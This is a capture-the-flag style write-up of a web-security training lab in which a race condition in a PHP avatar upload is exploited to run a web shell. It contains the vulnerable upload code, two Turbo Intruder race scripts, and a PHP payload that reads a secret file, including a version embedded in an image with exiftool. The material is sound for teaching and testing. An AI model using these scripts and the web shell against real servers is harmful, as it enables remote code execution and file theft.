---
title: "Expert Lab: Web Shell Upload via Race Condition"
published: true
tags: [Web Application Security, Web Security Academy, Expert Labs, File Upload Vulnerabilities, Race Condition Vulnerabilities, Turbo Intruder, Exiftool]
image: /blog/assets/2022/console.png
description: "Lab Description: This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them."
image_width: "130"
image_height: "130"
---

<br>
{% smart_image /blog/assets/2022/console.png 256 256 "" eager high %}
[^1]
<br>

## Lab Link
[Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

<br>
## Lab Description
* * *
<br>
This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

<br>
## Lab Hint
* * *
<br>
The vulnerable code that introduces this race condition is as follows:

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

<br>
## Solutions
* * *
<br>
### Solution 1: My Solution
The main logic for me to solve this lab was to upload a suitable sized file(not small not that large) then because of this vulnerable code exposed in hint section, I knew that my PHP file would be on the server for a fraction of a second then the virus and extension check would be done on it then because it is a PHP file and not a JPG or PNG, it would be deleted, so I could use race condition to read the PHP file in a few milliseconds that the file exists on the server before deletion so: I used Burp Turbo Intruder[^2] for solving this lab to be able to send GET requests to read the PHP file as fast as I can. A simple code is used in Turbo Intruder for solving this lab:

```py
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,

                           concurrentConnections=80,

                           requestsPerConnection=1,

                           pipeline=False

                           )

    i = 0

    while i < 10000:

        engine.queue(target.req, None)

        i += 1


def handleResponse(req, interesting):

    # currently available attributes are req.status, req.wordcount, req.length and req.response

    if req.status != 404:

        table.add(req)
```

I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a random 500KB PNG file from the web and used exiftool to add this code to it and renamed it to a PHP file:

```
exiftool -comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" diamond.php
```

then because of a line of code in vulnerable code in hint:

```php
$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
```

I changed the name of the file to the longest to increase the file processing (even for a few milliseconds) for `strtolower` function to maximum to save myself some time for race condition:

```
9LKhNJGiTLcMURUGt9a5WulDgvZwvvGDUlnfmPzaglT7VoZcV0lwo4sXK1emCplNsJsf2LU4Wa1arKxmik9iN0pCb4xBhBJ7Id8Bn2Ay6RhWPd2uHyBhhTnCjU7wgdGJjYNBBptx2ky9k0kWHCqpe09UGryPKiaNFugvgEWHpmAOjXxRY7JpH50hbtmw4uZQ3L0k0W2DpYBvcYvgTsXIW2tGiPdN.php
```

this was the biggest name that windows let me to use. then I made the file upload ready but before that, I started burp turbo intruder with the above code on this request as a NULL payload:

```http
GET /files/avatars/9LKhNJGiTLcMURUGt9a5WulDgvZwvvGDUlnfmPzaglT7VoZcV0lwo4sXK1emCplNsJsf2LU4Wa1arKxmik9iN0pCb4xBhBJ7Id8Bn2Ay6RhWPd2uHyBhhTnCjU7wgdGJjYNBBptx2ky9k0kWHCqpe09UGryPKiaNFugvgEWHpmAOjXxRY7JpH50hbtmw4uZQ3L0k0W2DpYBvcYvgTsXIW2tGiPdN.php HTTP/1.1
Host: aca11f781e0864bac09904d8002e00ef.web-security-academy.net
Cookie: session=vPq6ob4pyKBosm73un9VIH47fzVFKaqo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

then I hit upload on the web page in the browser to send the file, and after about one minute I could get some 200 responses in turbo intruder containing password for carlos! :)

<br>
### Solution 2:  Web Security Academy's Solution
The Web Security Academy solved this lab in a better and more precise way that can be used in the future race condition situations without bombarding the server with many requests:

As you can see from the hint source code above, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed.

<br>
#### Note
*Due to the generous time window for this race condition, it is possible to solve this lab by manually sending two requests in quick succession using Burp Repeater. The solution described here teaches you a practical approach for exploiting similar vulnerabilities in the wild, where the window may only be a few milliseconds.*

<br>

1.  Log in and upload an image as your avatar, then go back to your account page.

2.  In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`.

3.  On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

{:start="4"}
4.  Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.

5.  If you haven't already, add the Turbo Intruder extension to Burp from the BApp store.

6.  Right-click on the `POST /my-account/avatar` request that was used to submit the file upload and select **Extensions > Turbo Intruder > Send to turbo intruder**. The Turbo Intruder window opens.

7.  Copy and paste the following script template into Turbo Intruder's Python editor:

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

{:start="8"}
8.  In the script, replace `<YOUR-POST-REQUEST>` with the entire `POST /my-account/avatar` request containing your `exploit.php` file. You can copy and paste this from the top of the Turbo Intruder window.

9.  Replace `<YOUR-GET-REQUEST>` with a `GET` request for fetching your uploaded PHP file. The simplest way to do this is to copy the `GET /files/avatars/<YOUR-IMAGE>` request from your proxy history, then change the filename in the path to `exploit.php`.

10.  At the bottom of the Turbo Intruder window, click **Attack**. This script will submit a single `POST` request to upload your `exploit.php` file, instantly followed by 5 `GET` requests to `/files/avatars/exploit.php`.

11.  In the results list, notice that some of the `GET` requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.

12.  Submit the secret to solve the lab.

<br>
#### Note
*If you choose to build the `GET` request manually, make sure you terminate it properly with a `\r\n\r\n` sequence. Also remember that Python will preserve any whitespace within a multiline string, so you need to adjust your indentation accordingly to ensure that a valid request is sent.*

<br>
## My Comment
* * *
1. Use Burp Turbo Intruder for race condition tests.

2. There's always a risk for race condition and then remote code execution if the file upload mechanism uploads files on the server then validates them even if the file stays on the server for only a fraction of a second.

<br>
## _External Links_
* * *
* ### [Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

<br>
## _References_
* * *
[^1]: Icon made by [Freepik](https://www.flaticon.com/authors/freepik) from [www.flaticon.com](https://www.flaticon.com/)
[^2]: [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
